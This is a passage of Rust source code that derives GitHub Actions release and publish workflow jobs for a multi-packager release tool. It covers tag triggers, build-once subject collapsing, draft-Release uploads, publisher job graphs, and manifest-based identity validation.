            .map_or((false, pattern), |pattern| (true, pattern));
        if Pattern::new(pattern).is_ok_and(|pattern| pattern.matches_with(tag, options)) {
            included = !negative;
        }
    }
    included
}

/// Whether a top-level permission block already defaults to read-only.
fn read_only_permissions(permissions: Option<&Value>) -> bool {
    match permissions {
        Some(Value::Mapping(mapping)) => mapping
            .values()
            .all(|value| matches!(value.as_str(), Some("read" | "none"))),
        Some(Value::String(scope)) => scope == "read-all",
        _ => false,
    }
}

fn read_only_default() -> Value {
    let mut permissions = serde_yaml::Mapping::new();
    permissions.insert(
        Value::String("contents".to_owned()),
        Value::String("read".to_owned()),
    );
    Value::Mapping(permissions)
}

/// Job identifiers the executor owns in the compared document.
///
/// A reserved identifier is Intentional's even when a repository chose the same
/// name; the sentinel step identifies Intentional's own jobs after the
/// configured prefix changes.
fn owned_jobs(jobs: &serde_yaml::Mapping, namespaces: &PrefixNamespaces) -> Vec<String> {
    jobs.iter()
        .filter_map(|(id, job)| id.as_str().map(|id| (id, job)))
        .filter(|(id, job)| id.starts_with(&namespaces.job) || carries_sentinel(job))
        .map(|(id, _)| id.to_owned())
        .collect()
}

fn carries_sentinel(job: &Value) -> bool {
    job.get("steps")
        .and_then(Value::as_sequence)
        .is_some_and(|steps| {
            steps
                .iter()
                .any(|step| step.get("id").and_then(Value::as_str) == Some(OWNERSHIP_SENTINEL))
        })
}

/// Derive the complete contract for one workflow role.
fn derive_contract(
    root: &Path,
    config: &Config,
    github: &GithubConfig,
    role: WorkflowRole,
) -> std::result::Result<WorkflowContract, Vec<WorkflowDiagnostic>> {
    let namespaces = github
        .namespaces()
        .map_err(|error| vec![WorkflowDiagnostic::new("prefix-invalid", error.to_string())])?;
    let gates = github.workflow(role).gates.clone();
    match role {
        WorkflowRole::Release => release_contract(&namespaces, &gates),
        WorkflowRole::Publish => publish_contract(root, config, github, &namespaces, &gates),
    }
}

fn release_contract(
    namespaces: &PrefixNamespaces,
    gates: &[String],
) -> std::result::Result<WorkflowContract, Vec<WorkflowDiagnostic>> {
    let prepare = format!("{}prepare", namespaces.job);
    let release = format!("{}release", namespaces.job);
    let mut needs = vec![prepare.clone()];
    needs.extend(gates.iter().cloned());
    let jobs = vec![
        (prepare, job(RELEASE_PREPARE_JOB, namespaces, &[])),
        (
            release,
            job(
                RELEASE_AUTHORITY_JOB,
                namespaces,
                &[("@NEEDS@", &render_list(&needs))],
            ),
        ),
    ];
    Ok(WorkflowContract {
        namespaces: namespaces.clone(),
        triggers: vec![(
            vec!["on".to_owned(), "workflow_dispatch".to_owned()],
            Value::Null,
        )],
        concurrency: concurrency(&namespaces.environment),
        jobs: rendered_jobs(jobs)?,
    })
}

/// Collect rendered managed jobs, reporting a template that did not render.
fn rendered_jobs(
    jobs: Vec<(String, std::result::Result<Value, WorkflowDiagnostic>)>,
) -> std::result::Result<Vec<(String, Value)>, Vec<WorkflowDiagnostic>> {
    let mut rendered = Vec::new();
    for (id, body) in jobs {
        match body {
            Ok(body) => rendered.push((id, body)),
            Err(diagnostic) => return Err(vec![diagnostic]),
        }
    }
    Ok(rendered)
}

fn publish_contract(
    root: &Path,
    config: &Config,
    github: &GithubConfig,
    namespaces: &PrefixNamespaces,
    gates: &[String],
) -> std::result::Result<WorkflowContract, Vec<WorkflowDiagnostic>> {
    let mut diagnostics = Vec::new();
    // The global release tag is the one workspace tag that declares no executor
    // phase. Executor conformance requires exactly one; a configuration that has
    // not settled on one cannot state what triggers publication.
    let unphased = config.unphased_tags();
    // The one unphased workspace tag is the global release tag this workflow is
    // triggered by, so its literal affixes are derivation-time knowledge and a
    // recipe that needs the released version extracts it exactly rather than
    // guessing.
    let global_tag = unphased
        .first()
        .map_or_else(String::new, |tag| tag.template.clone());
    let mut patterns = unphased
        .iter()
        .map(|tag| Value::String(tag.template.replace("{version}", "*")))
        .collect::<Vec<_>>();
    let phased_templates = phased_tag_templates(config);
    patterns.extend(
        phased_templates
            .iter()
            .map(|template| Value::String(format!("!{}", template.replace("{version}", "*")))),
    );
    if unphased.len() != 1 {
        match unphased.len() {
            0 => {
                diagnostics.push(WorkflowDiagnostic::at(
                    "release-tag-undefined",
                    "the publish workflow is triggered by the one annotated global release tag, but no workspace tag omits require-phase; leave exactly one workspace tag unphased"
                        .to_owned(),
                    "workspace-tags",
                ));
                let release_unit = config.unphased_release_unit_tags();
                if !release_unit.is_empty() {
                    diagnostics.push(WorkflowDiagnostic::at(
                        "release-tag-undefined",
                        format!(
                            "the global release tag is sealed by every release plan, so it is a workspace tag; these release-unit tags omit require-phase and are sealed only when their own release unit releases: {}; give each a require-phase declaration",
                            release_unit.join(", ")
                        ),
                        "release-units",
                    ));
                }
            }
            _ => diagnostics.push(WorkflowDiagnostic::at(
                "release-tag-undefined",
                format!(
                    "the publish workflow is triggered by the one annotated global release tag, but {} workspace tags omit require-phase: {}; give all but one a require-phase declaration",
                    unphased.len(),
                    unphased
                        .iter()
                        .map(|tag| tag.id.as_str())
                        .collect::<Vec<_>>()
                        .join(", ")
                ),
                "workspace-tags",
            )),
        }
    }
    for template in &phased_templates {
        let rendered = template.replace("{version}", "1.2.3");
        if github_tag_filters_match(&patterns, &rendered) {
            diagnostics.push(WorkflowDiagnostic::at(
                "phase-tag-trigger-overlap",
                format!(
                    "the derived publish trigger matches phase tag {rendered}; exclude every configured phase-tag template so a publication run cannot trigger itself"
                ),
                "on.push.tags",
            ));
        }
    }
    let selection = resolve_publications(root, config).map_err(|error| {
        vec![WorkflowDiagnostic::new(
            "publication-unresolved",
            error.to_string(),
        )]
    })?;
    for diagnostic in selection.diagnostics {
        diagnostics.push(WorkflowDiagnostic::new(
            "publication-unresolved",
            diagnostic,
        ));
    }
    if !diagnostics.is_empty() {
        return Err(diagnostics);
    }

    let verify = format!("{}verify_tag", namespaces.job);
    let assemble = format!("{}assemble_evidence", namespaces.job);
    let close = format!("{}close_release", namespaces.job);
    let mut jobs = vec![(verify.clone(), job(PUBLISH_VERIFY_JOB, namespaces, &[]))];

    // One build job per distinct publishable subject, so a subject two
    // destinations distribute is produced once and both publisher jobs receive
    // the same immutable bytes. Distinctness is the release unit and the
    // packager that produces the format: two destinations of one packager are
    // one subject, and two package formats of one release unit are two.
    let subjects = distinct_subjects(root, config, &selection.selected)
        .map_err(|diagnostic| vec![diagnostic])?;
    let mut build_jobs = Vec::new();
    for subject in &subjects {
        let id = format!("{}build_{}", namespaces.job, subject.slug);
        build_jobs.push(id.clone());
        let mut needs = vec![verify.clone()];
        if subject.packager == Packager::CargoArchive {
            for platform in
                cargo_archive_platforms(subject, namespaces, &verify, &github.cargo_homebrew)
            {
                needs.push(platform.0.clone());
                jobs.push(platform);
            }
        }
        jobs.push((id, build_job(namespaces, &needs, subject, &global_tag)));
    }

    // A phase with no configured tag seals nothing, so its job is derived only
    // where the configuration declares it. Deriving one regardless would emit a
    // job whose command refuses the invocation.
    let declared = config.declared_phases();
    let before = declared
        .contains(&TagPhase::BeforePublication)
        .then(|| format!("{}tag_before_publication", namespaces.job));
    let after = declared
        .contains(&TagPhase::AfterPublication)
        .then(|| format!("{}tag_after_publication", namespaces.job));

    // The before-publication tag states what the release built and is committed
    // to publishing, so it seals after every build and before any publication.
    if let Some(before) = &before {
        let mut needs = vec![verify.clone()];
        needs.extend(build_jobs.iter().cloned());
        jobs.push((
            before.clone(),
            phase_tag_job(namespaces, TagPhase::BeforePublication, &needs),
        ));
    }

    // Only a subject whose packager produces GitHub-hosted deliverables gives
    // the upload job anything to place. Every other subject reaches a registry,
    // and a release built entirely of those derives no upload job at all.
    let hosted = subjects
        .iter()
        .filter(|subject| {
            crate::executor::steps::github_hosted_deliverables(subject.packager).is_some()
        })
        .collect::<Vec<_>>();
    // A publication receives a draft-asset handoff when its consumer path
    // resolves a Release asset and its subject produced one. The same decision
    // derives the step that writes the document and the input that names it to
    // the publisher, so the two cannot disagree about which publications have
    // one.
    let mut consumers = Vec::new();
    for publication in &selection.selected {
        if !crate::publication::draft::is_draft_dependent(publication.publisher) {
            continue;
        }
        let Some(subject) = hosted.iter().find(|subject| subject.covers(publication)) else {
            continue;
        };
        // Which files are native packages is what the release unit declared,
        // not what the two system-package adapters happen to distribute, so the
        // exclusion a descriptor adapter's handoff applies is read from the
        // packager's own configuration.
        let declared = if publication.packager == Packager::CargoArchive {
            subject
                .publishers
                .iter()
                .filter_map(|publisher| match publisher {
                    PublisherKind::Rpm => Some("rpm".to_owned()),
                    PublisherKind::Apt => Some("deb".to_owned()),
                    _ => None,
                })
                .collect()
        } else {
            let unit = &config.release_units[&publication.release_unit];
            crate::executor::goreleaser::read(&root.join(&unit.path))
                .map_err(|error| {
                    vec![WorkflowDiagnostic::at(
                        "packager-configuration-unreadable",
                        error.to_string(),
                        &format!("release-units.{}", publication.release_unit),
                    )]
                })?
                .map(|native| native.nfpm_formats)
                .unwrap_or_default()
        };
        let consumed = crate::executor::steps::consumed_deliverables(
            publication.publisher,
            &publication.release_unit,
            &declared,
        )
        .map_err(|refusal| {
            let path = refusal
                .path
                .unwrap_or_else(|| format!("release-units.{}", publication.release_unit));
            vec![WorkflowDiagnostic::at(refusal.code, refusal.message, &path)]
        })?;
        let Some(consumed) = consumed else {
            continue;
        };
        consumers.push(DraftConsumer {
            publication,
            subject,
            consumed,
        });
    }
    let upload = (!hosted.is_empty()).then(|| format!("{}upload_deliverables", namespaces.job));
    if let Some(upload) = &upload {
        let mut needs = vec![verify.clone()];
        needs.extend(build_jobs.iter().cloned());
        jobs.push((
            upload.clone(),
            upload_job(namespaces, &verify, &needs, &hosted, &consumers),
        ));
    }

    let publisher_upstream = before.clone().unwrap_or_else(|| verify.clone());
    let mut publication_completion_jobs = Vec::new();
    let mut identities = BTreeSet::new();
    for publication in &selection.selected {
        let id = publication_job_id(namespaces, publication);
        if !identities.insert(id.clone()) {
            return Err(vec![WorkflowDiagnostic::at(
                "job-identifier-collision",
                format!(
                    "publication {} derives managed job {id}, which another publication already claims",
                    publication.identity()
                ),
                &format!("jobs.{id}"),
            )]);
        }
        let subject = subjects
            .iter()
            .find(|subject| subject.covers(publication))
            .ok_or_else(|| {
                vec![WorkflowDiagnostic::at(
                    "subject-underived",
                    format!(
                        "publication {} distributes a subject no build job produces",
                        publication.identity()
                    ),
                    &format!("jobs.{id}"),
                )]
            })?;
        let mut needs = vec![publisher_upstream.clone()];
        // The build job stays an explicit dependency even when the
        // before-publication tag already transitively orders it, because the
        // publisher downloads that job's artifact and a graph that only
        // implies the producer is one refactor away from racing it.
        let producer = format!("{}build_{}", namespaces.job, subject.slug);
        if !needs.contains(&producer) {
            needs.push(producer);
        }
        // Every publisher waits on the upload job whether or not it reads a
        // Release asset. The barrier is what keeps repository write authority
        // in one job: a per-subject upload would narrow it and multiply the
        // jobs holding `contents: write` by the number of subjects.
        needs.extend(upload.iter().cloned());
        let handoff = consumers
            .iter()
            .find(|consumer| consumer.publication.identity() == publication.identity())
            .map(|_| identifier(&publication.identity()));
        let derived = publication_jobs(
            root,
            namespaces,
            &needs,
            publication,
            subject,
            config,
            handoff.as_deref(),
        )
        .map_err(|diagnostic| vec![diagnostic])?;
        jobs.push((id.clone(), Ok(derived.publisher)));
        if !identities.insert(derived.verification_id.clone()) {
            return Err(vec![WorkflowDiagnostic::at(
                "job-identifier-collision",
                format!(
                    "publication {} derives managed job {}, which another publication already claims",
                    publication.identity(), derived.verification_id
                ),
                &format!("jobs.{}", derived.verification_id),
            )]);
        }
        publication_completion_jobs.push(derived.verification_id.clone());
        jobs.push((derived.verification_id, Ok(derived.verification)));
    }

    // The after-publication tag seals the completed fragments, so it follows
    // every publisher job and precedes the assembly that reads what it sealed.
    if let Some(after) = &after {
        let mut needs = vec![verify.clone()];
        needs.extend(publication_completion_jobs.iter().cloned());
        jobs.push((
            after.clone(),
            phase_tag_job(namespaces, TagPhase::AfterPublication, &needs),
        ));
    }

    // Tag verification seeds the graph unconditionally so that closure can
    // never mint repository authority concurrently with the check that proves
    // the tag it is closing. Gate contributors are dependencies of assembly so
    // their contributions are available to it, and of closure so the configured
    // gate governs the final authority transition.
    let mut assemble_needs = vec![verify.clone()];
    assemble_needs.extend(publication_completion_jobs.iter().cloned());
    // Assembly classifies the sealed phase evidence by document identity, so
    // every tag job that produced one has to precede it or the evidence it
    // requires would simply be absent.
    assemble_needs.extend(before.iter().cloned());
    assemble_needs.extend(after.iter().cloned());
    assemble_needs.extend(gates.iter().cloned());
    let mut close_needs = vec![verify.clone(), assemble.clone()];
    close_needs.extend(gates.iter().cloned());
    jobs.push((
        assemble,
        job(
            PUBLISH_ASSEMBLE_JOB,
            namespaces,
            &[("@NEEDS@", &render_list(&assemble_needs))],
        ),
    ));
    jobs.push((
        close,
        job(
            PUBLISH_CLOSE_JOB,
            namespaces,
            &[
                ("@NEEDS@", &render_list(&close_needs)),
                ("@VERIFY@", &verify),
            ],
        ),
    ));

    Ok(WorkflowContract {
        namespaces: namespaces.clone(),
        triggers: vec![(
            vec!["on".to_owned(), "push".to_owned(), "tags".to_owned()],
            Value::Sequence(patterns),
        )],
        concurrency: concurrency(&format!(
            "{}publish-${{{{ github.ref }}}}",
            namespaces.job.replace('_', "-")
        )),
        jobs: rendered_jobs(jobs)?,
    })
}

/// Configured phase-tag templates with release-unit ids already rendered.
fn phased_tag_templates(config: &Config) -> Vec<String> {
    let mut templates = BTreeSet::new();
    for tag in config.workspace_tags.values() {
        if tag.require_phase.is_some() {
            templates.insert(tag.template.clone());
        }
    }
    for (release_unit_id, release_unit) in &config.release_units {
        for tag in release_unit.tags.values() {
            if tag.require_phase.is_some() {
                templates.insert(tag.template.replace("{id}", release_unit_id));
            }
        }
    }
    templates.into_iter().collect()
}

/// One publishable subject and the publications that distribute it.
#[derive(Debug, Clone, PartialEq, Eq)]
struct DistinctSubject {
    /// Release unit whose sources the subject is built from.
    release_unit: String,
    /// Configured package whose native artifact the subject represents.
    package: String,
    /// Packager that produces the subject's format.
    packager: Packager,
    /// Publisher routes whose deliverables this one subject must contain.
    publishers: BTreeSet<PublisherKind>,
    /// Derived Arch package repository, when this subject carries an AUR route.
    aur_destination: Option<String>,
    /// Identity every configured destination resolves the subject by.
    identity: String,
    /// Workspace-relative directory that owns the packager invocation.
    working_directory: String,
    /// Job and artifact name fragment.
    slug: String,
}

impl DistinctSubject {
    /// Whether one publication distributes this subject.
    fn covers(&self, publication: &SelectedPublication) -> bool {
        self.release_unit == publication.release_unit
            && self.package == publication.package
            && self.packager == publication.packager
    }
}

/// Collapse the selected publications into the subjects that must be built.
///
/// Two publications of one release unit that drive the same packager describe
/// one subject with two destinations, not two subjects. That collapse is what
/// makes the derived graph build once and promote, and it is the reason
/// distinctness is decided here rather than per publisher job.
fn distinct_subjects(
    root: &Path,
    config: &Config,
    publications: &[SelectedPublication],
) -> std::result::Result<Vec<DistinctSubject>, WorkflowDiagnostic> {
    let mut subjects: Vec<DistinctSubject> = Vec::new();
    for publication in publications {
        // Losing this collapse is not visible in the emitted document unless
        // the job identifier changes with it: two subjects deriving one slug
        // derive one job identifier, and the YAML mapping silently keeps the
        // last. The test that proves build-once therefore mutates the slug as
        // well, because that pair is what a real regression looks like. Do not
        // "fix" it by asserting on the collapsed mapping alone.
        if subjects.iter().any(|subject| subject.covers(publication)) {
            continue;
        }
        let unit = &config.release_units[&publication.release_unit];
        let package = &unit.packages[&publication.package];
        let working_directory = subject_directory(unit, package, publication.packager);
        let package_disambiguates = publications.iter().any(|candidate| {
            candidate.release_unit == publication.release_unit
                && candidate.packager == publication.packager
                && candidate.package != publication.package
        });
        let slug = if package_disambiguates {
            format!(
                "{}_{}_{}",
                identifier(&publication.release_unit),
                identifier(&publication.package),
                identifier(publication.packager.as_str())
            )
        } else {
            format!(
                "{}_{}",
                identifier(&publication.release_unit),
                identifier(publication.packager.as_str())
            )
        };
        subjects.push(DistinctSubject {
            release_unit: publication.release_unit.clone(),
            package: publication.package.clone(),
            packager: publication.packager,
            publishers: publications
                .iter()
                .filter(|candidate| {
                    candidate.release_unit == publication.release_unit
                        && candidate.package == publication.package
                        && candidate.packager == publication.packager
                })
                .map(|candidate| candidate.publisher)
                .collect(),
            aur_destination: publications
                .iter()
                .find(|candidate| {
                    candidate.release_unit == publication.release_unit
                        && candidate.package == publication.package
                        && candidate.packager == publication.packager
                        && candidate.publisher == PublisherKind::Aur
                })
                .and_then(|candidate| candidate.destination.clone()),
            identity: subject_identity(root, &working_directory, publication).map_err(
                |message| {
                    let (code, path) = if publication.packager == Packager::CargoArchive
                        && publication.publisher == PublisherKind::Homebrew
                    {
                        (
                            "homebrew-formula-underived",
                            format!(
                                "release-units.{}.packages.{}.homebrew",
                                publication.release_unit, publication.package
                            ),
                        )
                    } else if publication.packager == Packager::CargoArchive {
                        (
                            "cargo-archive-identity-underived",
                            format!(
                                "release-units.{}.packages.{}",
                                publication.release_unit, publication.package
                            ),
                        )
                    } else {
                        (
                            "subject-identity-invalid",
                            format!(
                                "release-units.{}.packages.{}",
                                publication.release_unit, publication.package
                            ),
                        )
                    };
                    WorkflowDiagnostic::at(code, message, &path)
                },
            )?,
            working_directory: working_directory.display().to_string(),
            slug,
        });
    }
    Ok(subjects)
}

/// Identity the destinations of one subject resolve it by.
///
/// A packager whose native manifest names the published artifact is the
/// authority on that name, because publisher evidence records the same native
/// identity and assembly compares the two. Where the format has no such name,
/// the release-unit id stands in.
///
/// This closed match is the seam, and it is deliberately not a configurable
/// one. [`Packager`] enumerates the maintained recipe catalog, so a destination
/// whose identity is not yet derived here is a packager arm this function has
/// not learned to read, not a value a repository could supply: an identity the
/// workspace could assert would let a release name a subject the destination
/// does not resolve, which is the disagreement the sealed subject exists to
/// catch. A recipe that finds the stand-in reaching its fragment refines this
/// arm; it must never make its fragment record the release-unit id instead,
/// because that agrees with the seal by making both sides wrong and silently
/// retires the cross-check.
///
/// This is also where a subject identity enters the model, so it is where the
/// value is held to a name its ecosystem could publish. Everything downstream
/// treats it as a name: it is written into a `sed` address, printed into a YAML
/// scalar, and passed to an Action. Validating at each of those is a rule the
/// next sink does not inherit, so the value is refused here instead and the
/// diagnostic names the manifest an author has to edit.
fn subject_identity(
    root: &Path,
    directory: &Path,
    publication: &SelectedPublication,
) -> std::result::Result<String, String> {
    let absolute_directory = root.join(directory);
    // The release-unit identifier is repository content whether or not it
    // stands in as the subject identity: it reaches an Action input, the
    // observation's YAML, and the publication identity verification resolves.
    // So it is held to the rule for every subject, and the manifest name is
    // held to its ecosystem's rule on top of that.
    let unit_origin = format!("release unit {}", publication.release_unit);
    let fallback = names::release_unit(&names::SuppliedName {
        origin: &unit_origin,
        value: &publication.release_unit,
    })?;
    let fallback = Ok(fallback);
    match publication.packager {
        Packager::Npm => {
            let Some(name) = std::fs::read_to_string(absolute_directory.join("package.json"))
                .ok()
                .and_then(|text| serde_json::from_str::<serde_json::Value>(&text).ok())
                .and_then(|manifest| {
                    manifest
                        .get("name")
                        .and_then(serde_json::Value::as_str)
                        .map(str::to_owned)
                })
            else {
                return fallback;
            };
            let manifest = directory.join("package.json");
            names::npm_package(&names::SuppliedName {
                origin: &format!("{} name", manifest.display()),
                value: &name,
            })
        }
        Packager::Cargo => {
            let Some(name) = std::fs::read_to_string(absolute_directory.join("Cargo.toml"))
                .ok()
                .and_then(|text| text.parse::<toml_edit::DocumentMut>().ok())
                .and_then(|manifest| {
                    manifest
                        .get("package")
                        .and_then(|package| package.get("name"))
                        .and_then(|name| name.as_str())
                        .map(str::to_owned)
                })
            else {
                return fallback;
            };
            let manifest = directory.join("Cargo.toml");
            names::cargo_crate(&names::SuppliedName {
                origin: &format!("{} package name", manifest.display()),
                value: &name,
            })
        }
        Packager::CargoArchive => {
            crate::executor::recipe::cargo_binary_identity(root, directory, &publication.identity())
        }
        // GoReleaser names the Homebrew formula, the system packages, and the
        // Arch package from one project name, so that name is what every
        // destination of a Go release unit resolves and it is read from the
        // packager's own configuration.
        Packager::GoReleaser => crate::executor::goreleaser::subject_identity(&absolute_directory)
            .ok()
            .flatten()
            .map_or(fallback, Ok),
        // The two OCI packagers are derived rather than stood in for. A Dev
        // Container Feature names itself in `devcontainer-feature.json`. A
        // Dockerfile-backed image names itself in the one place the format has
        // for it, the `org.opencontainers.image.title` label, which is also the
        // annotation its destinations carry, so the derivation reads the name a
        // consumer resolves rather than one the workspace happened to pick.
        //
        // Neither falls back to the release-unit id. A subject the recipe could
        // not name is exactly the state the sealed cross-check exists to
        // refuse, and every OCI destination has to resolve this name, so a
        // stand-in would publish under an identity no consumer asked for.
        Packager::Buildx => {
            let Some(name) = std::fs::read_to_string(absolute_directory.join("Dockerfile"))
                .ok()
                .and_then(|text| dockerfile_image_title(&text))
            else {
                return Err(format!(
                    "release unit {} builds an OCI image whose name the derivation cannot read; declare it as a literal {OCI_TITLE_LABEL} label in {}",
                    publication.release_unit,
                    directory.join("Dockerfile").display()
                ));
            };
            names::oci_subject(&names::SuppliedName {
                origin: &format!(
                    "{} {OCI_TITLE_LABEL} label",
                    directory.join("Dockerfile").display()
                ),
                value: &name,
            })
        }
        Packager::DevContainerCli => {
            let manifest = directory.join("devcontainer-feature.json");
            let Some(name) =
                std::fs::read_to_string(absolute_directory.join("devcontainer-feature.json"))
                    .ok()
                    .and_then(|text| serde_json::from_str::<serde_json::Value>(&text).ok())
                    .and_then(|manifest| {
                        manifest
                            .get("id")
                            .and_then(serde_json::Value::as_str)
                            .map(str::to_owned)
                    })
                    .filter(|id| !id.is_empty())
            else {
                return Err(format!(
                    "release unit {} publishes a Dev Container Feature whose id the derivation cannot read from {}",
                    publication.release_unit,
                    manifest.display()
                ));
            };
            names::oci_subject(&names::SuppliedName {
                origin: &format!("{} id", manifest.display()),
                value: &name,
            })
        }
    }
}

/// Directory owning the native evidence and packager invocation for one subject.
fn subject_directory(
    unit: &crate::config::ReleaseUnitConfig,
    package: &crate::config::PackageConfig,
    packager: Packager,
) -> PathBuf {
    match packager {
        // GoReleaser owns the whole version boundary: one project name and one
        // distribution configuration drive every command package in the unit.
        Packager::GoReleaser => unit.path.clone(),
        Packager::Npm
        | Packager::Cargo
        | Packager::CargoArchive
        | Packager::Buildx
        | Packager::DevContainerCli => {
            crate::config::join_relative_paths(&unit.path, &package.path)
        }
    }
}

/// Read the image name one Dockerfile declares, if it declares one.
///
/// A value built from a build argument names the image at build time rather
/// than in the source the release seals. Nothing here rejects it: the name is
/// accepted against the OCI repository-name grammar, which no expression can
/// satisfy, so refusing it twice would add a rule whose removal changes
/// nothing.
///
/// The last declaration wins, which is the rule the image itself follows: a
/// later stage's label overrides an earlier one, so a multi-stage build whose
/// builder stage carries a different title would otherwise name the subject
/// after a stage the release does not ship.
fn dockerfile_image_title(text: &str) -> Option<String> {
    let mut declared = None;
    let mut logical = String::new();
    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with('#') {
            continue;
        }
        match trimmed.strip_suffix('\\') {
            Some(head) => {
                logical.push_str(head.trim_end());
                logical.push(' ');
                continue;
            }
            None => logical.push_str(trimmed),
        }
        let statement = std::mem::take(&mut logical);
        let Some(labels) = statement
            .strip_prefix("LABEL ")
            .or_else(|| statement.strip_prefix("label "))
        else {
            continue;
        };
        if let Some(title) = label_value(labels, OCI_TITLE_LABEL) {
            declared = Some(title);
        }
    }
    declared
}

/// Value one `LABEL` statement assigns to one key, in either quoted form.
fn label_value(labels: &str, key: &str) -> Option<String> {
    for prefix in [format!("{key}="), format!("\"{key}\"=")] {
        let Some(index) = labels.find(&prefix) else {
            continue;
        };
        let rest = &labels[index + prefix.len()..];
        let value = match rest.strip_prefix('"') {
            Some(quoted) => quoted.split('"').next().unwrap_or_default(),
            None => rest.split_whitespace().next().unwrap_or_default(),
        };
        if !value.is_empty() {
            return Some(value.to_owned());
        }
    }
    None
}

fn concurrency(group: &str) -> Value {
    let mut mapping = serde_yaml::Mapping::new();
    mapping.insert(
        Value::String("group".to_owned()),
        Value::String(group.to_owned()),
    );
    mapping.insert(
        Value::String("cancel-in-progress".to_owned()),
        Value::Bool(false),
    );
    Value::Mapping(mapping)
}

/// Managed job identifier for one resolved publication.
fn publication_job_id(namespaces: &PrefixNamespaces, publication: &SelectedPublication) -> String {
    format!(
        "{}publish_{}_{}_{}_{}",
        namespaces.job,
        identifier(&publication.release_unit),
        identifier(&publication.package),
        publication.publisher.as_str(),
        identifier(&publication.target)
    )
}

/// Managed job identifier for one consumer retrieval separated from publication.
fn retrieval_job_id(namespaces: &PrefixNamespaces, publication: &SelectedPublication) -> String {
    format!(
        "{}retrieve_{}_{}_{}_{}",
        namespaces.job,
        identifier(&publication.release_unit),
        identifier(&publication.package),
        publication.publisher.as_str(),
        identifier(&publication.target)
    )
}

/// Reduce an arbitrary configured id to a GitHub job identifier fragment.
fn identifier(value: &str) -> String {
    value
        .chars()
        .map(|character| {
            if character.is_ascii_alphanumeric() {
                character.to_ascii_lowercase()
            } else {
                '_'
            }
        })
        .collect()
}

/// Build job producing one distinct subject and recording what it produced.
///
/// The packager writes its bytes to the path the graph names, and the portable
/// command digests exactly those bytes and reads the version from the verified
/// global release tag. Neither value is asserted by the recipe, so a build job
/// cannot record a subject it did not produce or a release it is not part of.
fn build_job(
    namespaces: &PrefixNamespaces,
    needs: &[String],
    subject: &DistinctSubject,
    global_tag: &str,
) -> std::result::Result<Value, WorkflowDiagnostic> {
    let mut tools = toolchain_steps(subject.packager).replace("@SLUG@", &subject.slug);
    if subject.packager == Packager::CargoArchive
        && subject
            .publishers
            .iter()
            .any(|publisher| matches!(publisher, PublisherKind::Rpm | PublisherKind::Apt))
    {
        tools.push_str(&nfpm_toolchain_steps());
    }
    job(
        PUBLISH_BUILD_JOB,
        namespaces,
        &[
            ("@NEEDS@", &render_list(needs)),
            ("@SLUG@", &subject.slug),
            (
                "@BUILD_NAME@",
                &scalar(&format!("Build the {} subject once", subject.identity)),
            ),
            (
                "@RECORD_NAME@",
                &scalar(&format!("Record the built {} subject", subject.identity)),
            ),
            (
                "@UPLOAD_NAME@",
                &scalar(&format!("Upload the built {} subject", subject.identity)),
            ),
            (
                "@DOCUMENT_NAME@",
                &scalar(&format!(
                    "Upload the {} built-subject document",
                    subject.identity
                )),
            ),
            ("@BUILD_COMMAND@", &build_command(subject.packager)),
            ("@BUILD_ENV@", &build_environment(subject, global_tag)),
            ("@TOOLCHAIN_STEPS@", &tools),
            ("@RELEASE_UNIT@", &scalar(&subject.release_unit)),
            ("@SUBJECT_IDENTITY@", &scalar(&subject.identity)),
            ("@WORKING_DIRECTORY@", &scalar(&subject.working_directory)),
        ],
    )
}

/// One draft-dependent publication and the subject whose assets it consumes.
struct DraftConsumer<'a> {
    /// Publication the handoff is written for.
    publication: &'a SelectedPublication,
    /// Subject whose GitHub-hosted deliverables the publication resolves.
    subject: &'a DistinctSubject,
    /// `find` predicate selecting the deliverables this publication consumes.
    consumed: String,
}

/// Artifact one publication's draft-asset handoff is transported as.
///
/// The producer and the consumer are one expression rather than two spellings.
/// A handoff whose artifact name or directory disagreed between the job that
/// writes it and the job that reads it would not fail loudly: the download
/// would resolve nothing, the publisher would pass a path with no file behind
/// it, and the failure would surface as a verification refusal naming the
/// destination instead of the transport.
fn handoff_artifact(namespaces: &PrefixNamespaces, slug: &str) -> String {
    format!("{}handoff-{slug}", namespaces.job)
}

/// Directory the handoff artifact is written to and unpacked into.
fn handoff_directory(namespaces: &PrefixNamespaces, slug: &str) -> String {
    format!("${{{{ runner.temp }}}}/{}handoff/{slug}", namespaces.job)
}

/// File one publication's draft-asset handoff is carried in.
fn handoff_file(namespaces: &PrefixNamespaces, slug: &str) -> String {
    format!(
        "{}/{}",
        handoff_directory(namespaces, slug),
        crate::publication::draft::DRAFT_HANDOFF_FILE
    )
}

/// Managed job placing every GitHub-hosted deliverable on the draft Release.
///
/// The job is derived only where the release builds a deliverable for it to
/// place. Deriving it regardless would emit a job holding repository
/// content-write authority for the duration of an upload it has nothing to
/// upload, which is the cost `immutable-github-release` weighs against
/// publisher concurrency and declines to pay twice.
fn upload_job(
    namespaces: &PrefixNamespaces,
    verify: &str,
    needs: &[String],
    hosted: &[&DistinctSubject],
    consumers: &[DraftConsumer<'_>],
) -> std::result::Result<Value, WorkflowDiagnostic> {
    let mut deliverable_steps = String::new();
    for subject in hosted {
        let find = crate::executor::steps::github_hosted_deliverables(subject.packager)
            .unwrap_or_default();
        deliverable_steps.push_str(&templates::step(
            PUBLISH_UPLOAD_STEP,
            &[
                (
                    "@DELIVERABLE_NAME@",
                    &scalar(&format!(
                        "Upload the {} deliverables to the draft Release",
                        subject.identity
                    )),
                ),
                ("@SUBJECT_IDENTITY@", &scalar(&subject.identity)),
                ("@SLUG@", &subject.slug),
                ("@DELIVERABLE_FIND@", find),
                ("@VERIFY@", verify),
            ],
        )?);
    }
    let mut handoff_steps = String::new();
    for consumer in consumers {
        let identity = consumer.publication.identity();
        let slug = identifier(&identity);
        let find = crate::executor::steps::github_hosted_deliverables(consumer.subject.packager)
            .unwrap_or_default();
        handoff_steps.push_str(&templates::step(
            PUBLISH_HANDOFF_STEP,
            &[
                (
                    "@HANDOFF_NAME@",
                    &scalar(&format!("Write the {identity} draft-asset handoff")),
                ),
                (
                    "@HANDOFF_UPLOAD_NAME@",
                    &scalar(&format!("Upload the {identity} draft-asset handoff")),
                ),
                (
                    "@HANDOFF_SCHEMA@",
                    crate::publication::draft::DRAFT_HANDOFF_SCHEMA,
                ),
                (
                    "@HANDOFF_CONTRACT@",
                    crate::publication::draft::DRAFT_HANDOFF_CONTRACT,
                ),
                ("@HANDOFF_ARTIFACT@", &handoff_artifact(namespaces, &slug)),
                ("@HANDOFF_DIRECTORY@", &handoff_directory(namespaces, &slug)),
                ("@HANDOFF@", &scalar(&handoff_file(namespaces, &slug))),
